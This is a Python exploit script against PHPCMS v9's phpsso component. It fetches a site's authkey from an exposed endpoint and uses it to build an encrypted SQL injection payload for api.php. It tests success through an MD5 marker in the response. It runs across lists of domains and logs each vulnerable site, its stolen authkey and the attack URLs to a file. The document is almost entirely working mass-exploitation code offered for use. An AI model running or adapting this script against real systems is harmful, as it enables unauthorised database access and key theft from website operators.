"""phpcmsv9 phpsso authkey sql"""
#!/usr/bin/env python
#-*-coding:utf-8-*-
import subprocess
import argparse
import sys
import coloredlogs, logging
import requests
import phpserialize
coloredlogs.install()

def getauthkey(url):
    """get authkey"""
    target = url + '/phpsso_server/index.php?\
    m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data'
    try:
        data = phpserialize.loads(requests.get(target).content)
        return data[1]['authkey']
    except:
        return None

def getpoc(authkey):
    """use anthkey to create payload"""
    proc = subprocess.Popen(['php -f ./auth.php '+ authkey], shell=True, stdout=subprocess.PIPE)
    poc = proc.stdout.read()
    return poc

def shotgun(url):
    """"use poc to check target"""
    if url.startswith("http://"):
        url = url
    else:
        url = 'http://' + url
    authkey = getauthkey(url)
    if authkey is not None:
        poc = getpoc(authkey)
        target = url + '/api.php?op=phpsso&code=' + poc
        flag = requests.get(target)
        if 'c4ca4238a0b923820dcc509a6f75849' in flag.content:
            # print "[+] %s success" % url
            logging.warning("[+] %s success" % url)
            saveinfo(url, authkey, target)
        else:
            print "[-] %s failed get sqlinfo" % url
    else:
        print "[-] %s failed get authkey" % url

def saveinfo(url, authkey, target):
    """save target site"""
    save = open("site_sqli.txt", "a+")
    save.write(url+'\n')
    save.write(authkey+"\n")
    save.write(url+'/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data'+'\n')
    save.write(target+"\n\n")
    save.close()

if __name__ == '__main__':
    PARSER = argparse.ArgumentParser()
    PARSER.add_argument('-u', '--url', type=str, default=None, help='target site')
    PARSER.add_argument('-f', '--file', type=str, default=None, help='target site file')

    ARGS = PARSER.parse_args()

    if ARGS.file is not None:
        with open(ARGS.file, "r") as domains:
            for domain in domains.readlines():
                shotgun(domain.strip('\n'))

    if ARGS.url is not None:
        shotgun(ARGS.url)

    if ARGS.url is None and ARGS.file is None:
        print "[*]Usage: python %s -u/-f" % sys.argv[0]
